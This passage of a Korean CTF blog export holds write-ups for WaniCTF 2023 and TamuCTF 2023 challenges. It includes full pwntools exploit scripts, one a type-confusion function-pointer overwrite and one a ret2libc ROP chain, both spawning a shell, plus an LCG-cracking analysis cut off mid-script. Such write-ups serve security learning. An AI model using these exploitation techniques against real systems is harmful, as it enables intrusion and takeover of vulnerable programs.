ÎçÆÍ∏∞ : <code>write_memo</code>Î•º Ïù¥Ïö©ÌïòÏó¨ Ìï®Ïàò Ìè¨Ïù∏ÌÑ∞ offset ÏûêÎ¶¨Ïóê <code>system</code> Ìï®Ïàò Ï£ºÏÜå ÎÑ£Í∏∞</li><li>Ìï®Ïàò Ìè¨Ïù∏ÌÑ∞Í∞Ä Ïã§ÌñâÎê† Ïàò ÏûàÎèÑÎ°ù <code>register_elective_class</code> Ïã§Ìñâ</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;timetable-pwn.wanictf.org&#x27;</span>, <span class="number">9008</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_memo</span>(<span class="params">memo</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;FRI 3&#x27;</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;WRITE MEMO FOR THE CLASS\n&#x27;</span>, memo)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">see_class</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;FRI 3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># elective_subjectÎ•º mandatory_subjectÎ°ú Ìó∑Í∞àÎ¶¨Í≤å Ìï¥ÏÑú</span></span><br><span class="line"><span class="comment"># memo[32]Î•º Ï†ÅÏùÑ Îïå Ìï®Ïàò Ìè¨Ïù∏ÌÑ∞Î•º ÎÑ£Ïñ¥ÏÑú</span></span><br><span class="line"><span class="comment"># elective_subject.student Ìï®Ïàò Ìè¨Ïù∏ÌÑ∞Î•º ÏàòÏ†ïÌï† Ïàò ÏûàÎèÑÎ°ù ÌïòÍ∏∞</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name :&#x27;</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;id :&#x27;</span>, <span class="string">&#x27;2000&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;major :&#x27;</span>, <span class="string">&#x27;100&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># mandatory_subject</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># elective_subject</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># elective_subjectÎ•º mandatory_subjectÎ°ú Ìó∑Í∞àÎ¶¨Í≤å Ìï¥ÏÑú </span></span><br><span class="line"><span class="comment"># mandatory_subjectÏùò memo[32]Ïóê Ï†ÅÎäî Ï§Ñ ÏïåÍ≥†</span></span><br><span class="line"><span class="comment"># elective_subjectÏùò memo[32]Ïóê Ï†ÅÏùÑ Í≤É Í∞ôÏùå</span></span><br><span class="line"><span class="comment"># payload = p64(e.got[&#x27;printf&#x27;])  </span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> <span class="comment"># &#x27;b&#x27;*8Ïù¥ Ìï®ÏàòÌè¨Ïù∏ÌÑ∞Ïóê Îì§Ïñ¥Í∞ê</span></span><br><span class="line">write_memo(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">see_class()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line"><span class="comment"># libc.address = libc_leak - libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line"><span class="comment"># info(hex(libc.address))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># func pointer -&gt; system .. </span></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27;*8</span></span><br><span class="line"><span class="comment"># system = libc.address + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line">system = libc_leak -<span class="number">0x1c9a20</span></span><br><span class="line"></span><br><span class="line">payload = p64(system) * <span class="number">2</span></span><br><span class="line">write_memo(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># register_elective_class</span></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Do_n0t_confus3_mandatory_and_el3ctive&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wani </category>
          
      </categories>
      
      
        <tags>
            
            <tag> type confusion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wani CTF 2023 review</title>
      <link href="/230509-wanictf2023-0review/"/>
      <url>/230509-wanictf2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1988">https://ctftime.org/event/1988</a></li></ul><p>Î™©ÏöîÏùº Ï†ÄÎÖÅÏóê ctftimeÏóê Îì§Ïñ¥Í∞îÎäîÎç∞ ÏúÑ Ïî®ÌÖùÏù¥ ÏßÑÌñâÏ§ëÏù¥ÏóàÎã§. </p><img src="/images/230509-wanictf2023-0review/pwnable.png" width=700/><br><p>Ïû†Íπê Ï∞∏Ïó¨ÌñàÎäîÎç∞ 7Î≤àÍπåÏßÄÎäî Ïà†Ïà† ÌíÄÎ†∏Îã§. 8Î≤à Î¨∏Ï†úÏóêÏÑú type confusion ÏùºÏúºÏºúÏÑú ÏõêÌïòÎäî Ìï®ÏàòÎ•º Ïã§ÌñâÏãúÌÇ§Îäî Í≤ÉÍπåÏßÄ ÏΩîÎìú ÏûëÏÑ±ÌïòÎäî Í≤ÉÏùÑ ÏÑ±Í≥µÌñàÎã§. Í∑ºÎç∞ libc addressÎ•º leakÌï¥ÏïºÌïòÎäî Í≤å Îñ†Ïò¨ÎùºÏÑú printÌïòÎäî Î∂ÄÎ∂ÑÏùÑ Ï∞æÏïÑÎ¥§Í≥†, Î®∏Î¶øÏÜçÏúºÎ°ú Ïù¥Î†áÍ≤å Ïù¥Î†áÍ≤å ÌïòÎ©¥ Îê† Í≤É Í∞ôÏùÄÎç∞.. ÍπåÏßÄ ÏÉùÍ∞ÅÌñàÎäîÎç∞,.. ÏßëÏ§ëÏù¥ Ïûò ÏïàÎêòÏñ¥ÏÑú Ïû§Îã§. Í∑∏Î¶¨Í≥† Í∏àÏöîÏùºÏóê Ïù¥Ïñ¥ÏÑú Î¨∏Ï†ú ÌíÄÎ†§Í≥† ÌñàÎäîÎç∞ Í∞úÏù∏Ï†ÅÏúºÎ°ú Ïä§Ìä∏Î†àÏä§ Î∞õÎäî ÏùºÏù¥ ÏûàÏñ¥ Ïª¥Ìì®ÌÑ∞Í∞Ä ÏÜêÏóê Ïûò ÏïàÏû°ÌòÄÏÑú Í≤∞Íµ≠ ÎåÄÌöåÏãúÍ∞Ñ ÎÇ¥Ïóê ÌíÄÏßÄ Î™ªÌñàÎã§. 9Î≤à Î¨∏Ï†úÎäî ÏñºÌïèÎ≥¥Îãà heapÏù¥ÎùºÏÑú Î≥¥ÏßÄ ÏïäÏïòÎã§. </p><p>ÏöîÏ¶ò Ïî®ÌÖùÏóê ÏûêÏ£º Ï∞∏Ïó¨ÌïòÎã§ Î≥¥Îãà ÎÇ¥Í∞Ä Ïûò ÏïÑÎäî Í≤ÉÎì§Ïóê ÎåÄÌï¥ Î°∏ÏóÖÏùÑ ÏûëÏÑ±Ìï¥ÏïºÌï†Íπå? ÎùºÎäî ÌïÑÏöîÏÑ±ÏùÑ ÎäêÍºàÎã§. Î∏îÎ°úÍ∑∏ ÌïòÎäî Îç∞Ïóê ÌîºÎ°úÍ∞êÏùÑ ÎäêÎÅºÍ≥† Ïã∂ÏßÄ ÏïäÏùÄÎç∞ Î°∏ÏóÖÏùÑ Ï†ÅÏñ¥Ïïº Ìï† Î¨∏Ï†úÎì§Ïù¥ ÎßéÏúºÎ©¥ Ï°∞Í∏àÏî© ÎØ∏Î£®Í≤å ÎêúÎã§. angstrom Ïî®ÌÖù Î°∏ÏóÖ Ï†ÅÍ≥†ÎÇòÏÑú ÎÇ¥ Î∏îÎ°úÍ∑∏ Î°∏ÏóÖÏùÑ Î≥¥Í≥† ÏπúÍµ¨ÏôÄ Ìï®Íªò ÏãúÏä§ÌÖú Ìï¥ÌÇπ ÏãúÏûëÌïòÍ∏∞Î°ú ÌñàÎã§Îäî Ïó∞ÎùΩÏùÑ ÎîîÏä§ÏΩîÎìúÎ°ú Î∞õÏïòÏùÑ Îïê Í∏∞ÎªêÏÑú ÏïûÏúºÎ°úÎèÑ Ïâ¨Ïö¥ Î¨∏Ï†úÎèÑ Î°∏ÏóÖÏùÑ Ïó¥Ïã¨Ìûà Ï†ÅÍ≤†Îã§Í≥† ÏÜçÏúºÎ°ú Îã§ÏßêÌñàÎäîÎç∞,.. „Öã„Öã^^; Î¨ºÎ°† Ï≤¥Î†•Í≥º ÏãúÍ∞ÑÏù¥ ÎßéÎã§Î©¥ Í∑∏Îü¨Í≤†ÏßÄÎßå ÏöîÏ¶ò Ï°∞Í∏à ÌîºÍ≥§ÌïòÍ∏∞ÎèÑ Ìï¥ÏÑú Ïù¥ Ïî®ÌÖùÏùÄ 7Î≤àÍπåÏßÄÎäî Î°∏ÏóÖÏùÑ Ï†ÅÏßÄ ÏïäÍ≥† 8Î≤àÎßå Ï†ÅÏúºÎ†§Í≥† ÌïúÎã§. (1Î≤àÎ∂ÄÌÑ∞ 7Î≤àÍπåÏßÄ Î¨∏Ï†ú Ïù¥Î¶ÑÏù¥ Í≥ß ÏùµÏä§ÌîåÎ°úÏûáÏù¥Îã§.)</p><br><img src="/images/230509-wanictf2023-0review/crypto.png" width=700/><br><p>Ïî®ÌÖù Ïª®ÏÖâÏù¥ beginner, Ï¥àÏã¨Ïûê ÌòπÏùÄ Ï§ëÍ∏âÏûêÍπåÏßÄ Î™®ÎëêÎ•º ÏïÑÏö∞Î•¥Îäî ÎÇúÏù¥ÎèÑÎ•º Í∞ÄÏßÄÍ≥† ÏûàÏñ¥ÏÑú Ï†ïÎßê Í∏∞Î≥∏Ï†ÅÏù∏ Ìè¨ÎÑàÎ∏î Î¨∏Ï†ú ÎßåÌÅº ÌÅ¨Î¶ΩÌÜ†ÎèÑ Í∑∏Îü¥ Í≤ÉÏù¥ÎùºÍ≥† ÏÉùÍ∞ÅÎêúÎã§. ÎÇ¥ ÎßàÏùåÏÜçÏùò ÌÅ¨Î¶ΩÌÜ†Ïóê ÎåÄÌïú ÏÇ¨ÎûëÏù¥ Ï°∞Í∏à ÏãπÎÇ¨Í∏∞ ÎïåÎ¨∏Ïóê.. Î∞ÄÎ¶∞ Î°∏ÏóÖÎì§ÏùÑ Ïò¨Î¶¨Í≥† ÌíÄÏñ¥Î¥êÎèÑ Ï¢ãÏùÑ ÎìØ ÌïòÎã§.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wani </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Inspector Gadget (pwn, rop)</title>
      <link href="/230503-tamu2023-1.Inspector_Gadget-pwn/"/>
      <url>/230503-tamu2023-1.Inspector_Gadget-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>Inspector Gadget gave me this binary with one goal. pwn.<br>Author: <code>_mac_</code></p></blockquote><ul><li>[128 solves &#x2F; 339 points]</li></ul><img src="/images/230503-tamu2023-1.Inspector_Gadget-pwn/Screenshot 2023-05-03 at 17.31.43.png" width=500/><br><p>ÏïÑÏã∏! ÎÇ¥Í∞Ä ÌçºÎ∏îÌñàÎã§!!</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Î¨∏Ï†ú Î∞îÏù¥ÎÑàÎ¶¨ÏôÄ Î¶ΩÏãú ÌååÏùºÏùÑ Ï†úÍ≥µÎ∞õÏïòÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] </span></span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL);</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>64bit ROPÏùò Ï†ïÏÑù Ï§ëÏóê Ï†ïÏÑùÏù¥ÎùºÍ≥† ÏÉùÍ∞ÅÌïúÎã§.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;inspector-gadget&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./inspector-gadget&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./inspector-gadget&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x40127b</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret) <span class="comment"># ret</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;ret2libc_r0p_g04t3d&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - PRNG (crypto, lcg)</title>
      <link href="/230503-tamu2023-10.PRNG-crypto/"/>
      <url>/230503-tamu2023-10.PRNG-crypto/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>I know they say don‚Äôt roll your own crypto, but secure RNG should be easy. How hard could it be?<br>Author: anomie</p></blockquote><ul><li>[78 solves &#x2F; 441 points]</li></ul><p>Ïù¥ Î¨∏Ï†ú Ìë∏ÎäîÎç∞ Í∞ÄÏû• Ïò§Îûò Í±∏Î¶∞ Í≤É Í∞ôÎã§.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, m, a, c</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rand</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.m = m</span><br><span class="line">        self.a = a</span><br><span class="line">        self.c = c</span><br><span class="line">        self.seed = seed</span><br><span class="line">        <span class="keyword">if</span> seed % <span class="number">2</span> == <span class="number">0</span>: <span class="comment"># initial state must be odd</span></span><br><span class="line">            self.seed += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.a * self.seed + self.c) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    seed = secrets.choice(<span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x7fffffffffffffff</span>))</span><br><span class="line">    rng = Rand(seed)</span><br><span class="line">    </span><br><span class="line">    chall = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        chall.append(rng.rand())</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Authenticate. Provide the next 10 numbers following&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> chall:</span><br><span class="line">        <span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> x != rng.rand():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Access denied.&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Access granted.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><code>seed = secrets.choice(range(0, 0x7fffffffffffffff))</code>Ïù¥Îü∞ ÏãùÏúºÎ°ú <code>seed</code>Î•º ÎûúÎç§ÏúºÎ°ú ÎßåÎì§Í≥†, <code>Rand</code> ÌÅ¥ÎûòÏä§ Í∞ùÏ≤¥Î•º ÎßåÎì†Îã§. Í∑∏Î¶¨Í≥† <code>rng.rand()</code>Ìïú Í∞í 10Í∞úÎ•º Ï∂úÎ†•Ìï¥Ï£ºÎäîÎç∞ Ïù¥Í≤ÉÏùÑ Î∞îÌÉïÏúºÎ°ú Îã§Ïùå <code>rng.rand()</code>Î•º 10Î≤à Ïó∞ÏÜçÏúºÎ°ú ÎßûÏ∂∞Ïïº <code>flag</code>Î•º Ï∂úÎ†•Ìï¥Ï§ÄÎã§. Î¨∏Ï†úÎäî <code>rng.rand()</code>Í∞Ä ÏïÑÎûòÍ∞ôÏù¥ Íµ¨ÌòÑÎêòÏñ¥ ÏûàÏñ¥ÏÑú Î¨∏Ï†úÏóêÏÑú Ï∂úÎ†•Ìï¥Ï§Ä <code>rng.rand()</code> Í∞íÏùÑ Î∞îÌÉïÏúºÎ°ú Îã§Ïùå <code>rng.rand()</code> Í∞íÏùÑ Íµ¨Ìï† Ïàò ÏûàÏùÑ Í≤É Í∞ôÏùÄ Í∏∞Î∂ÑÏù¥Îã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">self</span>):</span><br><span class="line">    self.seed = (self.a * self.seed + self.c) % self.m</span><br><span class="line">    <span class="keyword">return</span> self.seed</span><br></pre></td></tr></table></figure><p><code>m</code>, <code>a</code>, <code>c</code>Í∞Ä Í≥†Ï†ïÎêòÏñ¥ ÏûàÏñ¥ÏÑú Î∞©Ï†ïÏãùÏùÑ Ïù¥Ïö©Ìï¥ÏÑú Íµ¨Ìï† Ïàò ÏûàÏùÑ Í≤É Í∞ôÎã§!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(a * seed[i] + c) % m == seed[i+1]</span><br></pre></td></tr></table></figure><p>Ï∞∏Í≥†Î°ú Ïù¥Í±∏ <code>LCG ÏïåÍ≥†Î¶¨Ï¶ò</code>Ïù¥ÎùºÍ≥† ÌïòÎäîÎç∞ ÏúÑÏùò ÏãùÏóê Îî∞Îùº ÎÇúÏàòÍ∞Ä ÏÉùÏÑ±ÎêòÎäî ÏïåÍ≥†Î¶¨Ï¶òÏù¥Îã§. Ïù¥ ÏïåÍ≥†Î¶¨Ï¶òÏùÄ Î≥ÄÏàòÎ•º ÌÜµÌï¥ ÎÇúÏàòÎ•º ÏÉùÏÑ±ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê Î≥ÄÏàòÎ•º ÏïåÎ©¥ ÎÇúÏàòÎ•º ÏòàÏ∏°Ìï† Ïàò ÏûàÎã§Îäî Ï∑®ÏïΩÌïú ÏÑ±ÏßàÏùÑ Í∞ÄÏßÄÍ≥† ÏûàÎã§. Ïó¨Í∏∞ÏÑú <code>m</code>, <code>a</code>, <code>c</code>Î•º Íµ¨Ìï¥ÏïºÌïúÎã§Îäî ÌôïÏã†ÏùÑ Í∞ÄÏ°åÎã§.</p><h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">seed = [<span class="number">15292707418901107848</span>, <span class="number">3732399702731999469</span>, <span class="number">17727906530283792422</span>, <span class="number">5740441724751270531</span>, <span class="number">8708853459937082772</span>, <span class="number">10615078376953059625</span>, <span class="number">13017389135088601170</span>, <span class="number">12756134783055003231</span>, <span class="number">13176328566446297056</span>, <span class="number">5276211473026467749</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># a = BitVec(&#x27;a&#x27;, 64)</span></span><br><span class="line"><span class="comment"># c = BitVec(&#x27;c&#x27;, 64)</span></span><br><span class="line"><span class="comment"># m = BitVec(&#x27;m&#x27;, 64)</span></span><br><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">c = Int(<span 